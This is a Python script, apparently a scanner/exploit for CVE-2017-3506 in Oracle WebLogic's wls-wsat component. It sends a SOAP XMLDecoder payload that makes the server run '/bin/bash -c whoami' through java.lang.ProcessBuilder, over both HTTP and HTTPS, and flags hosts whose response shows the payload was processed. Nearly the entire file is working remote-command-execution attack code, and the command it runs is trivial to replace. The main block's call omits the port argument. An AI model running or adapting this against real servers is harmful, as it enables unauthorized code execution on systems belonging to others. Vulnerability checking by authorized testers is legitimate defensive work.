#coding:utf-8
#!/usr/bin/env 
#CVE_2017_3506(wls-wsat)

import socket
import ssl

payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>'''
socket.setdefaulttimeout(1) 

def check(ip,port):
    content_length = len(payload)
    try:
        client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #基于http
        client1.connect((ip,int(port)))
        client1.sendall(str.encode('''POST /wls-wsat/CoordinatorPortType11 HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length,payload)))
        buf1 = ""                                                    # 重要 ！！！ 接收分块传输数据包
        buf= "1" #client1.recv(1024)
        while len(buf):
            try:
                #print buf
                buf1 = buf1 + str(buf)
                buf = client1.recv(1024)
            except socket.error as e:
                break
        #print buf1                                                  #将接收到的分块传输包，汇总到buf1，输出（此处调试使用）
        client1.close()
        if "<faultstring>java.lang.ProcessBuilder" in buf1:
            return ip,port
    except socket.error as e:
        pass
    
    try:
        client2 = ssl.wrap_socket(socket.socket())                   #基于https
        client2.connect((ip,int(port)))
        client2.sendall(str.encode('''POST /wls-wsat/CoordinatorPortType11 HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length,payload)))
        buf1 = ""
        buf = "1"
        while len(buf):
            try:
                buf1 = buf1 + str(buf)
                buf = client2.recv(1024)
            except socket.error as e:
                break
        client2.close() 
        if "<faultstring>java.lang.ProcessBuilder" in buf1:
            return ip,port
    except socket.error as e:
        pass
       
if __name__=='__main__':
    print (check('127.0.0.1'))

